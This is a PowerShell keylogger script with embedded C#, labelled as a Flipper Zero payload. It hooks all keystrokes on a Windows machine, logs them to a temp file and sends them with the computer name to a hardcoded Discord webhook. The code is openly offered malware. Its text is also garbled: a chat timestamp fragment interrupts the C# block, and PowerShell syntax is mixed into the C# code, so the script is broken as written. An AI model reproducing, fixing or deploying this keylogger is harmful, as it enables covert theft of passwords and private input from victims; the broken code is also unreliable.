# Discord Webhook Keylogger for Flipper Zero (GitHub hosted)
# GitHub: https://github.com/ваш_аккаунт/ваш_репозиторий

$webhookUrl = "https://discordapp.com/api/webhooks/1369790444417843280/a9TksyeMBftjI4WtLVIh1-lY8_QiQf02cAMvw5BSmmxvP-Yz6k-IWWSM4kHPTBBXtXZk"
$logFilePath = "$env:TEMP\flipper_keys.log"

function Send-ToDiscord {
    param ([string]$message)
    
    $payload = @{
        content = $message
        username = "Flipper Keylogger"
    }
    
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
    } catch {
        # В случае ошибки пытаемся сохранить локально
        "[ERROR: $(Get-Date)] $_" | Out-File -Append "$env:TEMP\flipper_errors.log"
    }
}

# Проверяем соединение с интернетом
$internetTest = $true
try {
    Test-Connection -ComputerName "github.com" -Count 1 -ErrorAction Stop | Out-Null
} catch {
    $internetTest = $false
    "[START: $(Get-Date)] No internet connection" | Out-File -Append "$env:TEMP\flipper_errors.log"
}

if ($internetTest) {
    try {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        using System.Windows.Forms;
        
        public class KeyLogger {
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;
            
            private static LowLevelKeyboardProc _proc = HookCallback;
            private static IntPtr _hookID = IntPtr.Zero;
            private static string buffer = "";
            
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
            
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UnhookWindowsHookEx(IntPtr hhk);
            
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
            
            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
            
            public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            
            public static void Start() {
                _hookID = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            }
            
            private static IntPtr SetHook(LowLevelKeyboardProc proc) {
                using (var curModule = System.Diagnostics.Process.GetCurrentProcess().MainModule) {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
            
            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);
                    var key = (Keys)vkCode;
                    
                    if (key == Keys.Enter) {
                        buffer += "[ENTER]\n";
                    } elseif (key == Keys.Space) {
                        buffer += " ";
                    } elseif (key == Keys.Tab) {
                        buffer += "[TAB]";
                    } elseif (key == Keys.Back) {
                        if (buffer.Length > 0) {
                            buffer = buffer.Substring(0, buffer.Length - 1);
                        }
                    } else {
                        buffer += key.ToString();
                    }
                    
                    try {

ㅤ, [5/8/2025 1:25 AM]
[System.IO.File]::WriteAllText("$env:TEMP\flipper_keys.log", $buffer);
                    } catch {}
                    
                    if ($buffer.Length -ge 30) {
                        try {
                            $msg = "`Keylog data from $(env:COMPUTERNAME):\n$buffer```"
                            (New-Object Net.WebClient).UploadString("$webhookUrl", $msg)
                            $buffer = ""
                        } catch {
                            "[ERROR: $(Get-Date)] $_" | Out-File -Append "$env:TEMP\flipper_errors.log"
                        }
                    }
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
        }
"@

        [KeyLogger]::Start()
    } catch {
        Send-ToDiscord -message "Keylogger init error: $_"
    }
} else {
    # Если нет интернета, просто сохраняем локально
    "[START: $(Get-Date)] Starting offline logging" | Out-File -Append $logFilePath
    Add-Content -Path $logFilePath -Value "Waiting for internet connection to send data..."
}
